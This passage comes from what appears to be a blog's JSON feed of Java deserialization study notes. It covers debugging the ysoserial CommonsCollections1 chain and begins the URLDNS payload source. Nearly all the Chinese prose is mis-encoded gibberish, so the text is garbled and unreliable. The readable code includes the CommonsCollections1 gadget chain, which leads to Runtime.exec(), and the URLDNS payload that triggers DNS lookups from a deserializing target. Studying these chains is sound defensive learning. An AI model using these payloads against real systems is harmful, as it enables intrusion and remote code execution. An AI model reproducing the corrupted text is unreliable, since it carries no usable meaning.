çš„ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªä»£ç†å¯¹è±¡æ—¶éœ€è¦æ‰¾åˆ°å¦ä¸€ä¸ªå¯ä»¥è¿”å›å®ä¾‹çš„æ–¹æ³•</p>\n<p>é‚£å°±æ˜¯ newProxyInstance æ–¹æ³•å•¦</p>\n<p><img src=\"64.png\" alt=\"\"></p>\n<p>æ¥æµ‹è¯•è¯•è¯•</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * My Test Class</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        TestInvocationHandler handler = <span class=\"keyword\">new</span> TestInvocationHandler();</span><br><span class=\"line\">        Map testProxy = (Map) Proxy.newProxyInstance(Gadgets.class.getClassLoader(), <span class=\"keyword\">new</span> Class[]&#123;Map.class&#125;, handler);</span><br><span class=\"line\">        testProxy.put(<span class=\"string\">&quot;key&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestInvocationHandler</span> <span class=\"keyword\">implements</span> <span class=\"title\">InvocationHandler</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;method: &quot;</span> + method.toString());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>debug ä»£ç ï¼Œå¯ä»¥çœ‹è§å½“è°ƒç”¨ Map#put æ—¶ï¼Œä¼šè¿›å…¥ TestInvocationHandler#invoke</p>\n<p><img src=\"65.png\" alt=\"\"></p>\n<p>æ²¡æˆ³ proxy åˆ©ç”¨åˆ°çš„ç‚¹å°±è¿™ä¸€ä¸ªå•¦</p>\n<h3 id=\"è°ƒè¯•\"><a class=\"markdownIt-Anchor\" href=\"#è°ƒè¯•\">#</a> è°ƒè¯•</h3>\n<p>æ¯”è¾ƒç»•çš„åœ°æ–¹è°ƒè¯•ä¸€æ³¢</p>\n<p><img src=\"36.png\" alt=\"\"></p>\n<p>è¿›å…¥è¯¥å‡½æ•°ï¼Œå‘ç°æœ‰ä¸¤å¤„å‡½æ•°è®¡ç®—</p>\n<p><img src=\"37.png\" alt=\"\"></p>\n<p>è¿›å…¥ <code>createMemoizedInvocationHandler(map)</code></p>\n<p>å…¶ä¸­ <code>ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</code></p>\n<p>å¯ä»¥çœ‹å‡ºæ­¤å¤„æ˜¯é€šè¿‡åå°„è·å– AnnotationInvocationHandler å¯¹è±¡ï¼Œä¸”è·å–å¯¹è±¡æ—¶ä¼ å…¥äº†æ„é€ çš„ LazyMap</p>\n<p><img src=\"38.png\" alt=\"\"></p>\n<p>è¿›å…¥ <code>createProxy(handler,iface,ifaces)</code></p>\n<p>å¯¹ä¼ å…¥çš„ iface è¿›è¡Œä»£ç†ï¼Œå¹¶ä¼ å…¥ä¸Šä¸€æ­¥è·å¾—çš„ AnnotationInvocationHandler å¯¹è±¡ handler2</p>\n<p>iface ä¸ºä¼ å…¥çš„ Map.class (CommonsCollections1.java ä¸­ï¼š <code>mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</code> ï¼‰</p>\n<p><img src=\"39.png\" alt=\"\"></p>\n<p>ä¸¤æ¬¡å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œè¿”å› CommonsCollections1</p>\n<p>è¿”å›ä»£ç†å¯¹è±¡ mapProxyï¼ˆè°ƒç”¨è¯¥å¯¹è±¡ä»»æ„æ–¹æ³•ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨ä¼ å…¥çš„ handler#invokeï¼‰</p>\n<p>73 è¡Œä»£ç å°†è·å–åˆ°çš„ mapProxy è¿›è¡ŒåŒ…è£¹æ˜¯å› ä¸ºï¼š</p>\n<p>â€‹\tç”±äºååºåˆ—åŒ–å…¥å£ä¸º readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŸä¸ªç±»çš„ readObject ä¸­ä¼šè°ƒç”¨ä¼ å…¥ map çš„ä»»æ„æ–¹æ³•</p>\n<p>â€‹\tAnnotationInvocationHandler#readObject ä¸­æœ‰è°ƒç”¨ map.entrySet ()</p>\n<p>â€‹\tä»è€Œè§¦å‘ AnnotationInvocationHandler#invoke</p>\n<p><img src=\"40.png\" alt=\"\"></p>\n<p>æœ€åè¿”å›å±‚å±‚æ„é€ å¥½çš„ï¼Œè¿˜æ²¡æœ‰åºåˆ—åŒ–çš„ï¼Œpayload å•¦</p>\n<h2 id=\"payloadè§¦å‘åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#payloadè§¦å‘åˆ†æ\">#</a> payload è§¦å‘åˆ†æ</h2>\n<p>ä»¥ä¸‹æ˜¯ POC ä¸­ç»™å‡ºçš„è§¦å‘é“¾ï¼Œå¯ä»¥æ ¹æ® Gadget ä¸‹æ–­ç‚¹ï¼ˆè¿™æ ·æ¯”è¾ƒæ¸…æ™°æ„Ÿè§‰ï¼‰</p>\n<p>æ ¹æ®ä¸Šé¢ payload æ„é€ çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å¯ä»¥æ›´å¥½çš„ç†è§£è¯¥åˆ©ç”¨é“¾çš„è§¦å‘</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<p>é¦–å…ˆä» PayloadRunner38 è¡Œè¿›å…¥ååºåˆ—åŒ–</p>\n<p>å…¶ä¸­ serialized æ˜¯æˆ‘ä»¬åºåˆ—åŒ–åçš„ payload</p>\n<p><img src=\"41.png\" alt=\"\"></p>\n<p>è¿›å…¥ ObjectInputStream#readObject</p>\n<p><img src=\"42.png\" alt=\"\"></p>\n<p>åœ¨ AnnotationInvocationHandler#readObject å¤„ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹è°ƒç”¨æ ˆ</p>\n<p>è§‚å¯Ÿåˆ°åœ¨ ObjectInputStream ä¸­é€šè¿‡åå°„è°ƒç”¨äº† AnnotationInvocationHandler#readObject</p>\n<p><img src=\"43.png\" alt=\"\"></p>\n<p>è¿›å…¥ AnnotationInvocationHandler#readObject</p>\n<p>æ­¤å¤„ memberValues ä¸ºæˆ‘ä»¬ä¼ å…¥çš„ä»£ç†å¯¹è±¡ proxyMap</p>\n<p><img src=\"45.png\" alt=\"\"></p>\n<p>è°ƒç”¨å…¶ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥ AnnotationInvocationHandler#invoke</p>\n<p>è¿™é‡Œè¦è¿›å…¥å‡½æ•°ä¸€ç›´ç‚¹ç‚¹ç‚¹ï¼Œå…¶ä¸­ä¼šå¤šæ¬¡è¿”å›è¯¥è¡Œ</p>\n<p><img src=\"46.png\" alt=\"\"></p>\n<p>ç›´åˆ°å†æ¬¡è¿›å…¥ AnnotationInvocationHandler#readObjectï¼Œè¿è¡Œè‡³ 355 è¡Œè¿›å…¥å‡½æ•°ï¼Œä¼šè·³è½¬è‡³ AnnotationInvocationHandler#invoke</p>\n<p><img src=\"47.png\" alt=\"\"></p>\n<p>æŸ¥çœ‹å½“å‰å‡½æ•°è°ƒç”¨æ ˆ</p>\n<p>handler1 çš„ readObject -&gt; ä»£ç†å¯¹è±¡çš„ entrySet -&gt; handler2 çš„ invoke</p>\n<p><img src=\"48.png\" alt=\"\"></p>\n<p>æ„é€  handler2 æ—¶ï¼Œä¼ å…¥çš„ Map å¯¹è±¡å°±æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„ LazyMap</p>\n<p>æ­¤æ—¶åªè¦æœ‰è°ƒç”¨ LazyMap#getï¼Œå°±ä¼šæ‰§è¡Œ transform</p>\n<p>æŸ¥çœ‹å½“å‰å˜é‡ï¼Œthis.memberValues å°±æ˜¯ LazyMap å¯¹è±¡</p>\n<p><img src=\"49.png\" alt=\"\"></p>\n<p>å¾€ä¸‹æ»‘æ»‘æ»‘æ»‘æ»‘</p>\n<p>åœ¨ 78 è¡Œæ‰¾åˆ° <code>this.memberValues.get(var4)</code>  å•¦</p>\n<p><img src=\"50.png\" alt=\"\"></p>\n<p>è°ƒè¯•è¿›å…¥ LazyMap#getï¼Œå…¶ä¸­å½“è·å–çš„ key ä¸å­˜åœ¨æ—¶ï¼Œä¼šè¿›å…¥ if ä»£ç å—è°ƒç”¨æˆ‘ä»¬æ„é€ å¥½çš„ transform</p>\n<p><img src=\"51.png\" alt=\"\"></p>\n<p>æŸ¥çœ‹å˜é‡ï¼Œæ‰§è¡Œçš„ transform å°±æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„ï¼Œä¼šé€šè¿‡åå°„è·å–å‡½æ•°æ‰§è¡Œå‘½ä»¤</p>\n<p><img src=\"53.png\" alt=\"\"></p>\n<p>æŸ¥çœ‹å‡½æ•°è°ƒç”¨æ ˆï¼Œå’Œåˆ†æä¸­ç›¸åŒ</p>\n<p><img src=\"52.png\" alt=\"\"></p>\n<p>è°ƒåˆ°è¿™é‡Œå°±å®Œæˆè§¦å‘å•¦:happy:</p>\n<p>â­ç¢°è§äº†å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼Œæ¯”å¦‚æ ¹æœ¬ä¸ä¼šè·³è¿› LazyMap#get ä¸­ if ä¸­çš„ä»£ç å—ï¼Œæˆ–è€…è¿˜æ²¡åˆ°è¿™å°±å·²ç»å¼¹çª—äº†ï¼Œæˆ–è€…ç»†è°ƒæ—¶æ ¹æœ¬ä¸ä¼šå¼¹çª—â€¦ å›°æ‰°äº†æˆ‘å¾ˆä¹…ğŸ˜ª</p>\n<p>ä½†æ˜¯æ­£å¸¸è¿è¡Œæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæ‰€ä»¥æˆ‘å–æ¶ˆäº†æ‰€æœ‰é™¤æ­¤ä¹‹å¤–çš„æ–­ç‚¹ï¼ŒæŸ¥çœ‹å‡½æ•°è°ƒç”¨æ ˆå’Œå˜é‡éƒ½ OK äº†</p>\n<p>æ‰€ä»¥æ„Ÿè§‰åº”è¯¥æ˜¯ debug åœ¨å®ç°è‡ªèº«åŠŸèƒ½æ—¶æœ‰å½±å“åˆ°æ­£å¸¸ä»£ç çš„è§¦å‘ï¼Œè¿™é‡Œè¯´æ˜ä¸€ä¸‹å•¦</p>\n<h1 id=\"å“”å“”å“”å£æ°´æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#å“”å“”å“”å£æ°´æ€»ç»“\">#</a> å“”å“”å“”å£æ°´æ€»ç»“</h1>\n<p>çœ‹ p ç¥çš„æ–‡ç« ï¼Œä¸€ç‚¹ä¸€ç‚¹ä»”ç»†çœ‹äº†ä¸€é</p>\n<p><img src=\"54.png\" alt=\"\"></p>\n<p>ç„¶åè„‘è¢‹ç“œå­å°±ç³Šäº†</p>\n<p><img src=\"55.jpg\" alt=\"\"></p>\n<p>ç„¶åå°±ä» URLDNS å¼€å§‹å†çœ‹ä¸€é</p>\n<p>ç„¶åå‘ç°å“‡å¡</p>\n<p>URLDNS çœŸçš„å¥½ç®€å•è€¶</p>\n<p>æ€ä¹ˆä¼šæœ‰äººçœ‹ä¸æ‡‚è¿™ä¹ˆç®€å•çš„åŸç†å‘€ä¸ä¼šæŠŠä¸ä¼šå§</p>\n<p><img src=\"57.jpg\" alt=\"\"></p>\n<p>ç„¶åçœ‹ cc1ï¼ŒæŠŠ payload åŸç†åˆçœ‹äº†ä¸€éï¼Œä»€ä¹ˆ transform ä¹Ÿå¤ªç®€å•äº†æŠŠï¼Œä¸å°±æ˜¯è¿™æ ·å—ï¼Œè¿™æœ‰ä»€ä¹ˆéš¾åº¦å—ï¼Ÿï¼Ÿï¼Ÿ</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>ç„¶åçœ‹è§¦å‘åŸç†è°ƒè¯•çš„æ—¶å€™å°±æ˜¯è¿™æ ·äº† (beiwei)</p>\n<p><img src=\"59.png\" alt=\"\"></p>\n<p>ç”±å…¶æ˜¯è¿˜ç¢°è§äº†è°ƒè¯•ä¸Šçš„é—®é¢˜</p>\n<p>å·¦å·¦å³å³è°ƒè¯•äº†ä¸€ä¸¤ä¸ªæ˜ŸæœŸæŠŠ</p>\n<p><img src=\"60.jpeg\" alt=\"\"></p>\n<p>ä¸€ç›´æƒ³æŠŠæ•´ä¸ªè¿‡ç¨‹ç®€æ´ä¼˜é›…çš„æ€»ç»“å‡ºæ¥ï¼Œæ‰€ä»¥ä¸æ–­åœ°æ€»ç»“æ€»ç»“ï¼Œç”»å›¾è®°ç¬”è®°â€¦</p>\n<p>å› ä¸ºèƒ½ç®€å•çš„æŠŠé—®é¢˜è§£é‡Šæ¸…æ¥šæ‰èƒ½è¯æ˜è‡ªå·±æ˜¯çœŸçš„ç†è§£äº†ï¼ˆä¸ç„¶å°±å’Œç¬¬ä¸€éçœ‹ p å¤§æ–‡ç« çš„æƒ…å†µä¸€æ ·äº†ï¼‰</p>\n<p>ç„¶åè°ƒå®Œäº†ç†è§£äº†æ€»ç»“äº†è®°ç¬”è®°äº†ï¼Œæˆ‘åˆè¡Œäº†</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>è¿™ä¹Ÿå¤ªç®€å•äº†å§</p>\n<p>ä¸ä¼šå§ä¸ä¼šå§ä¼šéš¾é“è¿˜æœ‰äººçœ‹ä¸æ‡‚ cc1 å—</p>\n<p>ä»¥ä¸Šä½œæ­»çš„è¡Œä¸ºåªæ˜¯æƒ³æé†’è‡ªå·±ï¼Œå¾ˆå¤šå¾ˆéš¾çš„çŸ¥è¯†ç‚¹ä¸€å®šè¦è‡ªå·±åŠ¨æ‰‹å»è¯•ï¼Œå¤šæ€»ç»“ï¼Œä¸€å®šè¦å†™æ–‡ç« è®°å½•ä¸‹æ¥ï¼ˆå¹´çºªå¤§äº†çœŸçš„ä¼šå¿˜çš„ï¼‰ï¼Œç»†èŠ‚ä¸è¦æ”¾è¿‡ï¼Œä¸€ç‚¹ä¸€ç‚¹æŠ </p>\n<p>æˆ‘çœŸçš„ä¸æ˜¯å°å¤©æ‰ï¼Œæˆ‘åªæ˜¯ä¸ªå°ç¥ä»™ç½¢äº†ï¼Œå”‰</p>\n<p><img src=\"61.gif\" alt=\"\"></p>\n<p>ä¸‹å›¾æ˜¯åœ¨ç†è§£è§¦å‘åŸç†æ—¶è‡ªå·±å†™çš„ä¸€ä¸ªå¤§æ¦‚çš„æµç¨‹ï¼ˆå°½é‡ç®€æ´ä½†æ˜¯ä¸æ˜¯å¾ˆç®€æ´ï¼‰</p>\n<p>çœ‹ä¸çœ‹å¾—æ‡‚å°±çœ‹ç¼˜åˆ†äº†ğŸ˜´</p>\n<p><img src=\"60.png\" alt=\"\"></p>\n",
            "tags": [
                "Javaååºåˆ—åŒ–"
            ]
        },
        {
            "id": "http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/",
            "url": "http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/",
            "title": "ysoserialä¹‹URLDNSè°ƒè¯•",
            "date_published": "2021-08-25T03:38:45.000Z",
            "content_html": "<h1 id=\"åˆ©ç”¨é“¾ç®€è¿°\"><a class=\"markdownIt-Anchor\" href=\"#åˆ©ç”¨é“¾ç®€è¿°\">#</a> åˆ©ç”¨é“¾ç®€è¿°</h1>\n<ol>\n<li>è§¦å‘ç»“æœä¸ºä¸€æ¬¡ DNS è¯·æ±‚ï¼Œé€‚ç”¨ç›®æ ‡æ— å›æ˜¾æƒ…å†µ</li>\n<li>ä½¿ç”¨ java å†…ç½®ç±»æ„é€ ï¼Œæ— ç¬¬ä¸‰æ–¹åº“ä¾èµ–</li>\n</ol>\n<h1 id=\"urldnsåˆ©ç”¨ä»£ç \"><a class=\"markdownIt-Anchor\" href=\"#urldnsåˆ©ç”¨ä»£ç \">#</a> URLDNS åˆ©ç”¨ä»£ç </h1>\n<p>pocï¼š</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> ysoserial.payloads;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.InetAddress;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLConnection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLStreamHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Reflections;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class=\"line\"><span class=\"comment\"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   This was inspired by  Philippe Arteau <span class=\"doctag\">@h</span>3xstream, who wrote a blog</span></span><br><span class=\"line\"><span class=\"comment\"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class=\"line\"><span class=\"comment\"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class=\"line\"><span class=\"comment\"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class=\"line\"><span class=\"comment\"> *   standard JDK classes.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class=\"line\"><span class=\"comment\"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class=\"line\"><span class=\"comment\"> *   during a comparison (either equals or hashCode).</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class=\"line\"><span class=\"comment\"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class=\"line\"><span class=\"comment\"> *   it to trigger a DNS lookup.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   Gadget Chain:</span></span><br><span class=\"line\"><span class=\"comment\"> *     HashMap.readObject()</span></span><br><span class=\"line\"><span class=\"comment\"> *       HashMap.putVal()</span></span><br><span class=\"line\"><span class=\"comment\"> *         HashMap.hash()</span></span><br><span class=\"line\"><span class=\"comment\"> *           URL.hashCode()</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@Dependencies()</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">URLDNS</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectPayload</span>&lt;<span class=\"title\">Object</span>&gt; </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String url)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//Avoid DNS resolution during payload creation</span></span><br><span class=\"line\">                <span class=\"comment\">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class=\"line\">                URLStreamHandler handler = <span class=\"keyword\">new</span> SilentURLStreamHandler();</span><br><span class=\"line\"></span><br><span class=\"line\">                HashMap ht = <span class=\"keyword\">new</span> HashMap(); <span class=\"comment\">// HashMap that will contain the URL</span></span><br><span class=\"line\">                URL u = <span class=\"keyword\">new</span> URL(<span class=\"keyword\">null</span>, url, handler); <span class=\"comment\">// URL to use as the Key</span></span><br><span class=\"line\">                ht.put(u, url); <span class=\"comment\">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                Reflections.setFieldValue(u, <span class=\"string\">&quot;hashCode&quot;</span>, -<span class=\"number\">1</span>); <span class=\"comment\">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">return</span> ht;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">                PayloadRunner.run(URLDNS.class, args);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class=\"line\"><span class=\"comment\">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class=\"line\"><span class=\"comment\">         * using the serialized object.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span 